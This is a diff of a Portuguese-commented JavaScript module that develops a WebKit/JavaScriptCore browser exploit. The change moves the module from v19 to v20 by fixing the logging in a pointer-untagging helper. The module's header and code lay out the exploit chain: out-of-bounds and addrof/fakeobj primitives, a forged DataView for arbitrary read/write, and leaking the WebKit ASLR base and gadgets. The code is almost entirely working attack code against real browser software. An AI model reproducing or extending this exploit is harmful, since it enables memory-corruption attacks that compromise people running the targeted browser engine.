@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v19 - Com Untagging do Endereço da DataView Structure)
+// js/script3/testArrayBufferVictimCrash.mjs (v20 - Correção de Escopo do Logger para Untagging)
 // =======================================================================================
-// ESTA VERSÃO CORRIGE A LEITURA DO ENDEREÇO DA DATAVIEW STRUCTURE APLICANDO UNTAGGING.
+// ESTA VERSÃO CORRIGE O ERRO DE ESCOPO DO LOG NA FUNÇÃO UNTAGGING.
 // 1. Validar primitivas OOB locais.
 // 2. Estabilizar e validar addrof_core/fakeobj_core.
-// 3. Vazar o ENDEREÇO REAL da JSC::Structure de DataView do heap JS, AGORA COM UNTAGGING.
+// 3. Vazar o ENDEREÇO REAL da JSC::Structure de DataView do heap JS, AGORA COM UNTAGGING E LOG.
 // 4. Configurar e testar a PRIMITIVA DE L/E ARBITRÁRIA UNIVERSAL (via fakeobj DataView) usando o endereço REAL.
 // 5. Vazar a base ASLR da WebKit usando a agora funcional primitiva de L/E Universal.
 // 6. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
@@ -27,7 +27,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v19 - Com Untagging do Endereço da DataView Structure";
+export const FNAME_MODULE = "v20 - Correção de Escopo do Logger para Untagging";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -36,13 +36,13 @@ const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
 const LOCAL_SHORT_SHORT_PAUSE = 50;
 
-const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Constante para JSValue (8 bytes)
-const OBJECT_PTR_TAG_HIGH = 0x402a0000; // Tag comum para ponteiros de objeto em JSValue doubles.
+const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8;
+const OBJECT_PTR_TAG_HIGH = 0x402a0000;
 
 let global_spray_objects = [];
 let hold_objects = [];
 
-let _fake_data_view = null; // A DataView forjada para ARB R/W universal
+let _fake_data_view = null;
 
 
 // Funções Auxiliares Comuns (dumpMemory)
@@ -81,25 +81,23 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
 /**
  * Remove a tag de um AdvancedInt64 que representa um JSValue (ponteiro de objeto).
  * @param {AdvancedInt64} taggedAddr O AdvancedInt64 representando o JSValue taggeado.
+ * @param {Function} logFn Função de log para depuração.
  * @returns {AdvancedInt64} O AdvancedInt64 com a tag removida.
  */
-function untagJSValuePointer(taggedAddr) {
+function untagJSValuePointer(taggedAddr, logFn) {
     if (!isAdvancedInt64Object(taggedAddr)) {
-        // Se não for um AdvancedInt64, tenta converter (ou lança erro).
-        // Isso não deveria acontecer se o valor vier de arb_read(..., 8).
-        try { taggedAddr = new AdvancedInt64(taggedAddr); } catch (e) { /* ignora */ }
+        logFn(`[Untagging] ERRO: Valor para untagging não é AdvancedInt64. Tipo: ${typeof taggedAddr}.`, "critical", "untagJSValuePointer");
+        throw new TypeError("Valor para untagging não é AdvancedInt64.");
     }
     
-    // Assume que a tag está nos bits mais significativos do high word.
     const original_high = taggedAddr.high();
-    const untagged_high = original_high & 0x0000FFFF; // Mascara para remover os bits da tag.
+    const untagged_high = original_high & 0x0000FFFF;
     
-    // Verifica se a tag esperada estava presente.
     if ((original_high & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH & 0xFFFF0000)) {
         return new AdvancedInt64(taggedAddr.low(), untagged_high);
     }
     // Se a tag não corresponde, retorna o original sem alteração, mas loga um aviso.
-    log(`[Untagging] ALERTA: Tentou untaggar valor com high inesperado (0x${original_high.toString(16)}). Nenhuma tag removida.`, "warn", "untagJSValuePointer");
+    logFn(`[Untagging] ALERTA: Tentou untaggar valor com high inesperado (0x${original_high.toString(16)}). Nenhuma tag removida. Valor: ${taggedAddr.toString(true)}`, "warn", "untagJSValuePointer");
     return taggedAddr;
 }
 
@@ -406,19 +404,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         // 1. Crie um DataView real para obter o endereço da sua Structure.
         const real_data_view = new DataView(new ArrayBuffer(8)); // Pequeno DataView real
-        hold_objects.push(real_data_view); // Garante que não seja coletado
+        hold_objects.push(real_data_view);
         const real_data_view_addr = addrof_core(real_data_view);
         logFn(`[DV STRUCTURE LEAK] Endereço do DataView real: ${real_data_view_addr.toString(true)}`, "info");
 
         // 2. Leia o ponteiro da Structure desse DataView real usando arb_read (local).
         // A leitura deve retornar um JSValue (ponteiro taggeado).
         const data_view_structure_pointer_offset_from_dv = real_data_view_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
-        let tagged_data_view_structure_address = await arb_read(data_view_structure_pointer_offset_from_dv, 8); // Ponteiro REAL para a DataView Structure (TAGGEADO)
+        let tagged_data_view_structure_address = await arb_read(data_view_structure_pointer_offset_from_dv, 8);
 
         logFn(`[DV STRUCTURE LEAK] Ponteiro DataView Structure LIDO (potencialmente taggeado): ${tagged_data_view_structure_address.toString(true)}`, "leak");
 
         // 3. Aplique o untagging ao endereço da Structure vazado.
-        const data_view_structure_address = untagJSValuePointer(tagged_data_view_structure_address);
+        const data_view_structure_address = untagJSValuePointer(tagged_data_view_structure_address, logFn); // Passando logFn
 
         if (!isAdvancedInt64Object(data_view_structure_address) || data_view_structure_address.equals(AdvancedInt64.Zero)) {
             const errMsg = `Falha na leitura/untagging do endereço da DataView Structure: ${data_view_structure_address.toString(true)}. Abortando exploração.`;
@@ -434,7 +432,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         let universalRwConfigSuccess = false;
 
         for (const candidate_m_mode of mModeCandidates) {
-            logFn(`[${FNAME_CURRENT_TEST_TEST}] Tentando configurar _fake_data_view com m_mode: ${toHex(candidate_m_mode)} (usando vtable REAL)...`, "info");
+            logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando configurar _fake_data_view com m_mode: ${toHex(candidate_m_mode)} (usando vtable REAL)...`, "info");
             universalRwConfigSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                 logFn,
                 pauseFn,
@@ -613,10 +611,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
     return {
         errorOccurred: final_result.success ? null : final_result.message,
-        addrof_result: { success: true, msg: "Primitiva addrof funcional." },
+        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
         webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
         heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
         oob_value_of_best_result: 'N/A (UAF Strategy)',
-        tc_probe_details: { strategy: 'Heisenbug -> ARB R/W' }
+        tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
     };
 }
